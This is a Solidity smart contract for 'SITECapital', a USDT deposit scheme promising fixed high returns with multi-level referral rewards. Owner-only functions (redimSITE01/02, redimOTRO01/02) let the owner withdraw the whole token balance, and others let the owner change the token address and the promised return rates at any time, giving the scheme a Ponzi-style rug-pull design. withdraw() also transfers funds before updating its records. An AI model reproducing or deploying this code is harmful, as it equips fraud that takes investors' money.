pragma solidity ^0.5.15;

import "./SafeMath.sol";

contract TRC20_Interface {
  function allowance(address _owner, address _spender) public view returns (uint remaining);
  function transferFrom(address _from, address _to, uint _value) public returns (bool);
  function transfer(address direccion, uint cantidad) public returns (bool);
  function balanceOf(address who) public view returns (uint256);
  function decimals() public view returns(uint);
}

contract SITECapital {
  using SafeMath for uint;

  TRC20_Interface USDT_Contract;
  TRC20_Interface OTRO_Contract;

  struct Deposit {
    uint porciento;
    uint tiempo;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    bool recompensa;
    address sponsor;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }

  uint public MIN_DEPOSIT = 100*10**8;
  uint public MAX_DEPOSIT = 11000*10**8;

  uint public MIN_RETIRO = 70*10**8;
  uint public MAX_RETIRO = 500000*10**8;

  address payable public owner;

  uint[5] public primervez = [30, 10, 0, 0, 0];

  uint[5] public porcientos = [5, 3, 0, 0, 0];

  uint public basePorcientos = 1000;
  bool public sisReferidos = true;

  uint public dias = 90;
  uint public porcent = 115;
  uint public velocidad = 3;

  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;


  mapping (address => Investor) public investors;

  constructor(address _tokenTRC20) public {
    USDT_Contract = TRC20_Interface(_tokenTRC20);
    owner = msg.sender;
    investors[msg.sender].registered = true;
    investors[msg.sender].recompensa = true;
    investors[msg.sender].sponsor = address(0);

    totalInvestors++;

  }

  function ChangeTokenUSDT(address _tokenTRC20) public returns (bool){

    require( msg.sender == owner );

    USDT_Contract = TRC20_Interface(_tokenTRC20);

    return true;

  }

  function ChangeTokenOTRO(address _tokenTRC20) public returns (bool){

    require( msg.sender == owner );

    OTRO_Contract = TRC20_Interface(_tokenTRC20);

    return true;

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function InContractSITE() public view returns (uint){
    return USDT_Contract.balanceOf(address(this));
  }

  function InContractOTRO() public view returns (uint){
    return OTRO_Contract.balanceOf(address(this));
  }

  function InContractTRX() public view returns (uint){
    return address(this).balance;
  }
  
  function tiempo() public view returns (uint){
     return dias.mul(86400).div(velocidad);
  }

  function setPorcientos(uint _value_1, uint _value_2, uint _value_3, uint _value_4, uint _value_5) public returns(uint, uint, uint, uint, uint){

    require( msg.sender == owner );

    porcientos = [_value_1, _value_2, _value_3, _value_4, _value_5];

    return (_value_1, _value_2, _value_3, _value_4, _value_5);

  }

  function setPrimeravezPorcientos(uint _value_1, uint _value_2, uint _value_3, uint _value_4, uint _value_5) public returns(uint, uint, uint, uint, uint){

    require( msg.sender == owner );

    primervez = [_value_1, _value_2, _value_3, _value_4, _value_5];

    return (_value_1, _value_2, _value_3, _value_4, _value_5);

  }

  function setMinimoMaximos(uint _MIN_DEPOSIT, uint _MAX_DEPOSIT, uint _MIN_RETIRO, uint _MAX_RETIRO) public returns(bool){

    require( msg.sender == owner );

    if (_MIN_DEPOSIT != 0){
      MIN_DEPOSIT = _MIN_DEPOSIT;
    }
    if (_MAX_DEPOSIT != 0){
      MAX_DEPOSIT = _MAX_DEPOSIT;
    }
    if (_MIN_RETIRO != 0){
      MIN_RETIRO = _MIN_RETIRO;
    }
    if (_MAX_RETIRO != 0){
      MAX_RETIRO = _MAX_RETIRO;
    }

    return true;

  }

  function setTiempo(uint _dias) public returns(uint){

    require( msg.sender == owner );
    dias = _dias;
    
    return (_dias);

  }

  function setBase(uint _100) public returns(uint){

    require( msg.sender == owner );
    basePorcientos = _100;
    
    return (_100);

  }

  function controlReferidos(bool _true_false) public returns(bool){

    require( msg.sender == owner );
    sisReferidos = _true_false;
    
    return (_true_false);

  }

  function setRetorno(uint _porcentaje) public returns(uint){

    require( msg.sender == owner );
    porcent = _porcentaje;

    return (porcent);

  }

  function setvelocidad(uint _velocidad) public returns(uint){

    require( msg.sender == owner );
    velocidad = _velocidad;

    return (velocidad);

  }


  function column (address yo) public view returns(address[5] memory res) {

    res[0] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[1] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[2] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[3] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[4] = investors[yo].sponsor;
    yo = investors[yo].sponsor;

    return res;
  }

  function rewardPrimervez(address yo, uint amount) internal {

    address[5] memory referi = column(yo);
    uint[5] memory a;
    uint[5] memory b;

    for (uint i = 0; i < 5; i++) {

      Investor storage usuario = investors[referi[i]];
      if (usuario.registered && primervez[i] != 0 && usuario.recompensa){
        if ( referi[i] != address(0) ) {

          b[i] = primervez[i];
          a[i] = amount.mul(b[i]).div(basePorcientos);

          usuario.balanceRef += a[i];
          usuario.totalRef += a[i];
          totalRefRewards += a[i];

        }else{

          break;
        }
      }
    }


  }

  function rewardReferers(address yo, uint amount) internal {

    address[5] memory referi = column(yo);
    uint[5] memory a;
    uint[5] memory b;

    for (uint i = 0; i < 5; i++) {

      Investor storage usuario = investors[referi[i]];
      if (usuario.registered && porcientos[i] != 0 && usuario.recompensa){
        if ( referi[i] != address(0) ) {

          b[i] = porcientos[i];
          a[i] = amount.mul(b[i]).div(basePorcientos);

          usuario.balanceRef += a[i];
          usuario.totalRef += a[i];
          totalRefRewards += a[i];

        }else{
          break;
        }
      }
    }


  }

  function deposit(uint _value, address _sponsor) public {

    Investor storage usuario = investors[msg.sender];

    require(_value >= MIN_DEPOSIT, "Minimo de deposito alcanzado");
    require(_value <= MAX_DEPOSIT, "Maximo de deposito alcanzado");
    require(usuario.invested+_value <= MAX_DEPOSIT, "Maximo de deposito alcanzado");

    require( USDT_Contract.allowance(msg.sender, address(this)) >= _value, "aprovado insuficiente");
    require( USDT_Contract.transferFrom(msg.sender, address(this), _value), "saldo insuficiente" );

    if (!usuario.registered){

      usuario.registered = true;
      usuario.recompensa = true;
      usuario.sponsor = _sponsor;
      if (_sponsor != address(0) && sisReferidos ){
        rewardPrimervez(msg.sender, _value);
      }
      
      totalInvestors++;

    }else{

      if (usuario.sponsor != address(0) && sisReferidos ){
        rewardReferers(msg.sender, _value);
      }

    }

    usuario.deposits.push(Deposit(porcent, tiempo(), _value, block.number));

    usuario.invested += _value;
    totalInvested += _value;

  }


  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = dep.tiempo;
      uint porcientD = dep.porciento;

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }


  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = dep.tiempo;
      uint porcientD = dep.porciento;

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }

  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];

    uint amount = withdrawable(msg.sender);

    amount += investor.balanceRef;
    investor.balanceRef = 0;

    investor.paidAt = block.number;

    return amount;

  }


  function withdraw() external {

    Investor storage usuario = investors[msg.sender];

    uint amount = withdrawable(msg.sender);
    amount = amount+usuario.balanceRef;

    require ( USDT_Contract.balanceOf(address(this)) >= amount, "The contract has no balance");
    require ( amount >= MIN_RETIRO, "The minimum withdrawal limit reached");
    require ( amount <= MAX_RETIRO, "The maximum withdrawal limit reached");
    require ( usuario.withdrawn+amount <= MAX_RETIRO, "The maximum withdrawal limit reached");

    require ( USDT_Contract.transfer(msg.sender,amount), "whitdrawl Fail" );

    profit();

    usuario.withdrawn += amount;

  }

  function redimSITE01() public returns (uint256){
    require(msg.sender == owner);

    uint256 valor = USDT_Contract.balanceOf(address(this));

    USDT_Contract.transfer(owner, valor);

    return valor;
  }

  function redimSITE02(uint _value) public returns (uint256) {

    require ( msg.sender == owner, "only owner");

    require ( USDT_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");

    USDT_Contract.transfer(owner, _value);

    return _value;

  }

  function redimOTRO01() public returns (uint256){
    require(msg.sender == owner);

    uint256 valor = OTRO_Contract.balanceOf(address(this));

    OTRO_Contract.transfer(owner, valor);

    return valor;
  }

  function redimOTRO02(uint _value) public returns (uint256){

    require ( msg.sender == owner, "only owner");

    require ( OTRO_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");

    OTRO_Contract.transfer(owner, _value);

    return _value;

  }

  function () external payable {}

}